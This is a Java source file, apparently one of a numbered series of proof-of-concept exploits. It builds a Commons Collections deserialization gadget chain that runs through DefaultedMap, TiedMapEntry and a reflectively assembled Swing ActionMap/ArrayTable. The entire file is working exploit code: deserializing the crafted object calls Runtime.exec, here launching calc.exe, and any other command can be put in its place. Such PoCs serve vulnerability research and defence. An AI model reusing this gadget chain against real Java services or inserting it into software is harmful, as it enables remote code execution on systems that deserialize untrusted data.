package com.example.CC3;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import com.example.Utils.Share;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.DefaultedMap;

import javax.swing.*;
import javax.swing.text.DefaultEditorKit;
import javax.xml.transform.Templates;

public class POC_21 {

    /***
     * run with actionMap_hashCode.jar
     */

    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
        };
        Transformer transformChain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(1) });
        ReflectionUtil.setField(transformChain, "iTransformers", transformers);
        DefaultedMap d = new DefaultedMap("1");
        TiedMapEntry t = new TiedMapEntry(d, TrAXFilter.class);

        ActionMap map = new ActionMap();
        DefaultEditorKit.BeepAction action = new DefaultEditorKit.BeepAction();
        Class atClass = Class.forName("javax.swing.ArrayTable");
        Object arrayTable = ReflectionUtil.createWithoutConstructor(atClass);
        Object[] table = new Object[16];
        for (int i = 0; i < 16; i += 2) {
            table[i] = i == 14 ? t : "key" + i;
            table[i + 1] = action;
        }

        ReflectionUtil.setField(arrayTable, "table", table);
        ReflectionUtil.setField(map, "arrayTable", arrayTable);
        ReflectionUtil.setField(d, "value", transformChain);
        SerializeUtil.deserialize(SerializeUtil.serialize(map));
    }

}
